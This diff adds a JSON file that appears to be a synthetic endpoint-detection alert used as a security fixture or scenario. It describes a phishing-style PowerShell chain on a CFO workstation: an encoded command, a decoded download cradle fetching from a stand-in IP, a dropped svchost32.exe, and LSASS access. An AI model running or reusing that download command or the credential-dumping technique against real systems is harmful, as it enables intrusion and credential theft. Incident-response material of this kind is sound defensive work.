@@ -1,0 +1,152 @@
+{
+  "meta": {
+    "query_time": 0.003,
+    "powered_by": "falconx",
+    "trace_id": "cs-trace-20241115-184347"
+  },
+  "resources": [
+    {
+      "detection_id": "ldt:8f2a4b91e33a471cae44b2fdb8812201:884921003",
+      "created_timestamp": "2024-11-15T16:42:47.882Z",
+      "max_severity": 100,
+      "max_severity_displayname": "Critical",
+      "status": "new",
+      "assigned_to_name": null,
+      "device": {
+        "device_id": "8f2a4b91e33a471cae44b2fdb8812201",
+        "hostname": "WS-CFO-01",
+        "external_ip": "10.10.1.45",
+        "local_ip": "10.10.1.45",
+        "os_version": "Windows 10 22H2",
+        "platform_name": "Windows",
+        "site_name": "LifeTech-HQ",
+        "groups": ["executives", "prevent-disabled-cfo-exception"]
+      },
+      "behaviors": [
+        {
+          "behavior_id": "10602",
+          "scenario": "suspicious_process_tree",
+          "ioa_type": "process",
+          "objective": "Falcon Detection Method",
+          "tactic": "Execution",
+          "tactic_id": "TA0002",
+          "technique": "Command and Scripting Interpreter: PowerShell",
+          "technique_id": "T1059.001",
+          "display_name": "Malicious PowerShell via Office Application",
+          "description": "PowerShell with obfuscated encoded payload was spawned by OUTLOOK.EXE. Command line contains -NonInteractive, -WindowStyle Hidden, and -EncodedCommand flags.",
+          "filename": "powershell.exe",
+          "filepath": "\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "cmdline": "powershell.exe  -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAJwApADsAJABkAD0AJABjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADcALwB1AHAAZABhAHQAZQAnACkA",
+          "cmdline_decoded": "$c=New-Object System.Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');$d=$c.DownloadString('https://203.0.113.87/update')",
+          "pid": 3784,
+          "parent_image_filename": "OUTLOOK.EXE",
+          "parent_cmdline": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+          "parent_pid": 2240,
+          "user_name": "m.cohen",
+          "user_id": "S-1-5-21-3847948241-1882284908-4023491847-1844",
+          "timestamp": "2024-11-15T16:42:33Z",
+          "sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f57",
+          "md5": "7353f60b1739074eb17c5f4dddefe239"
+        },
+        {
+          "behavior_id": "41003",
+          "scenario": "network_connection_to_malicious_ip",
+          "ioa_type": "network",
+          "objective": "Falcon Detection Method",
+          "tactic": "Command and Control",
+          "tactic_id": "TA0011",
+          "technique": "Application Layer Protocol: Web Protocols",
+          "technique_id": "T1071.001",
+          "display_name": "Suspicious Outbound HTTPS Connection",
+          "description": "Process powershell.exe established outbound HTTPS connection to 203.0.113.87 which is not in the organisation's allowlist.",
+          "local_ip": "10.10.1.45",
+          "local_port": 51204,
+          "remote_ip": "203.0.113.87",
+          "remote_port": 443,
+          "protocol": "TCP",
+          "connection_direction": "outbound",
+          "connection_count": 3,
+          "first_seen": "2024-11-15T16:42:41Z",
+          "last_seen": "2024-11-15T16:43:04Z"
+        },
+        {
+          "behavior_id": "10604",
+          "scenario": "suspicious_file_write_appdata",
+          "ioa_type": "file",
+          "objective": "Falcon Detection Method",
+          "tactic": "Persistence",
+          "tactic_id": "TA0003",
+          "technique": "Boot or Logon Autostart Execution: Registry Run Keys",
+          "technique_id": "T1547.001",
+          "display_name": "Executable Written to AppData",
+          "description": "Executable file svchost32.exe written to non-standard location C:\\Users\\m.cohen\\AppData\\Roaming\\Microsoft\\Windows\\ by powershell.exe",
+          "filename": "svchost32.exe",
+          "filepath": "\\Device\\HarddiskVolume4\\Users\\m.cohen\\AppData\\Roaming\\Microsoft\\Windows\\svchost32.exe",
+          "sha256": "3b4c14a87e5f9d8c2a1f4e6b9c0d2e7a1b3c5d8f2a4e6c8b0d3e5a7c1f4b8d2e",
+          "md5": "a8f5f167f44f4964e6c998def96b5e7d",
+          "pe_compile_time": "2018-04-09T08:00:00Z",
+          "pe_compile_time_note": "⚠ TIMESTOMPED — compile date predates Windows 10 API calls found in binary",
+          "file_size_bytes": 184320,
+          "timestamp": "2024-11-15T16:43:08Z"
+        },
+        {
+          "behavior_id": "10401",
+          "scenario": "lsass_access",
+          "ioa_type": "process",
+          "objective": "Falcon Detection Method",
+          "tactic": "Credential Access",
+          "tactic_id": "TA0006",
+          "technique": "OS Credential Dumping: LSASS Memory",
+          "technique_id": "T1003.001",
+          "display_name": "LSASS Memory Access",
+          "description": "Process svchost32.exe opened LSASS (PID 728) with GrantedAccess 0x1010 (PROCESS_QUERY_INFORMATION|PROCESS_VM_READ)",
+          "source_process": "svchost32.exe",
+          "source_pid": 4128,
+          "target_process": "lsass.exe",
+          "target_pid": 728,
+          "granted_access": "0x1010",
+          "timestamp": "2024-11-15T16:46:22Z"
+        }
+      ],
+      "network_accesses": [
+        {
+          "connection_direction": "OUTBOUND",
+          "local_address": "10.10.1.45",
+          "local_port": 51204,
+          "remote_address": "203.0.113.87",
+          "remote_port": 443,
+          "protocol": "TCP",
+          "timestamp": "2024-11-15T16:42:41Z"
+        },
+        {
+          "connection_direction": "OUTBOUND",
+          "local_address": "10.10.1.45",
+          "local_port": 51211,
+          "remote_address": "203.0.113.87",
+          "remote_port": 443,
+          "protocol": "TCP",
+          "timestamp": "2024-11-15T16:49:22Z"
+        },
+        {
+          "connection_direction": "OUTBOUND",
+          "local_address": "10.10.1.45",
+          "local_port": 51288,
+          "remote_address": "203.0.113.87",
+          "remote_port": 443,
+          "protocol": "TCP",
+          "timestamp": "2024-11-15T16:56:03Z"
+        }
+      ],
+      "ioc_hit": null,
+      "prevention_policy": {
+        "policy_id": "cs-policy-exec-detect-only",
+        "policy_type": "prevention",
+        "name": "Executive Detect-Only Policy",
+        "description": "Applied to executives — behavioral detections enabled, automatic prevention disabled",
+        "prevent": false,
+        "detect": true,
+        "note": "⚠ POLICY GAP: This machine is in detect-only mode. svchost32.exe was NOT automatically killed. Manual remediation required."
+      }
+    }
+  ]
+}
